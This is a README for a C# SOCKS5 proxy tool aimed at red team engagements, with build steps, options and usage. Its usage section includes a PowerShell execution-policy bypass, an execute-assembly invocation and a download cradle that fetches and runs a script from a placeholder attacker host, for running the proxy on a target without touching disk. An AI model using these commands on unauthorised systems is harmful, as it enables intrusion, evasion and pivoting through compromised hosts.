# cs-socksd

C# SOCKS5 proxy server for red team engagements. Port of [socksd](https://github.com/tr1x/socksd).

Single-file, zero dependencies, cross-compiled from Kali to .NET Framework 4.x. Runs on any Windows machine (Win7+ / Server 2012+) without installing anything.

## Build

Requires Mono on Kali:

```bash
sudo apt install mono-devel
```

```bash
make          # compile socksd.exe
make loader   # generate socksd.ps1 reflective loader
make all      # both
make clean    # remove build artifacts
```

## Usage

Drop `socksd.exe` on target, or use the reflective loader:

```
socksd.exe -i 0.0.0.0 -p 1080
socksd.exe -i 10.10.10.100 -p 4200 -u user -P pass
socksd.exe -q -p 1080
```

### Reflective loader (fileless)

```powershell
# From disk
powershell -ep bypass -f socksd.ps1 -i 0.0.0.0 -p 1080

# Download cradle
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/socksd.ps1'); Invoke-SocksD -i 0.0.0.0 -p 1080
```

### Execute-assembly

```
execute-assembly socksd.exe -i 0.0.0.0 -p 1080
```

## Options

```
-i <ip>       Listen address (default: 0.0.0.0)
-p <port>     Listen port (default: 1080)
-u <user>     Username for SOCKS5 auth
-P <pass>     Password for SOCKS5 auth
-1            Auth-once: whitelist IP after first successful auth
-b            Bind outgoing connections to listen IP
-q            Quiet mode (suppress all output)
```

## Features

- SOCKS5 CONNECT (IPv4, IPv6, DNS resolution)
- Optional username/password authentication
- Auth-once IP whitelisting for clients that don't support SOCKS5 auth
- Async I/O — scales to many concurrent connections
- 15-minute idle timeout on relayed connections
- .NET Framework 4.x — pre-installed on every modern Windows box
- Fileless execution via PowerShell reflective loader or `Assembly.Load(byte[])`
